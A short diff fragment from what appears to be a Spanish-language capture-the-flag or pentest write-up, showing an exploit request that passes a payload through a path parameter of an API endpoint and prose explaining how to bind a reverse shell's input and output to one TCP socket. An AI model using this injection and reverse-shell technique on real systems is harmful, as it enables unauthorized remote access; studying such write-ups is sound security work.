@@ -527,3 +527,4 @@ step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 La idea es que conectes la entrada (`stdin`) y la salida (`stdout` y `stderr`) al mismo socket TCP para que la shell interactiva funcione correctamente. Este comando ahora debería permitir la comunicación completa entre el atacante y el shell en la máquina objetivo.
 
 ![[Pasted image 20240908160423.png]]
+
